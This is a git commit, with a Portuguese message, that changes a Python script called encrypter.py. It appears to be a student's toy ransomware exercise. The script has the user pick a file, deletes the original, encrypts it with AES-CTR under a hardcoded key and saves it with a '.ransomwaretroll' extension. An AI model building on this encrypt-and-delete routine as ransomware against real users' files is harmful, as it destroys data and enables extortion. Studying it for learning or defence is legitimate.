2e1f44b43d8fb0f3260da44e9f248e961cb2182d
Bryan Young Carvalho Soares <75449151+BryanYunche@users.noreply.github.com>
2025-01-31 17:21:06 -0300

    Fiz com que o usuário possa selecionar um arquivo qualquer

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,38 @@
 import os
 import pyaes
+import tkinter as tk
+from tkinter import filedialog
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Criar uma janela oculta do Tkinter
+root = tk.Tk()
+root.withdraw()
 
-## remover o arquivo
-os.remove(file_name)
+# Abrir um diálogo para selecionar um arquivo
+file_path = filedialog.askopenfilename(title="Selecione um arquivo para criptografar")
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# Verifica se o usuário selecionou um arquivo
+if file_path:
+    # Ler o arquivo
+    with open(file_path, "rb") as file:
+        file_data = file.read()
+    
+    # Remover o arquivo original
+    os.remove(file_path)
+    
+    # Definir a chave de criptografia
+    key = b"testeransomwares"
+    aes = pyaes.AESModeOfOperationCTR(key)
+    
+    # Criptografar o arquivo
+    crypto_data = aes.encrypt(file_data)
+    
+    # Criar um novo nome para o arquivo criptografado
+    new_file_path = file_path + ".ransomwaretroll"
+    
+    # Salvar o arquivo criptografado
+    with open(new_file_path, "wb") as new_file:
+        new_file.write(crypto_data)
+    
+    print(f"Arquivo criptografado salvo como: {new_file_path}")
+else:
+    print("Nenhum arquivo foi selecionado.")
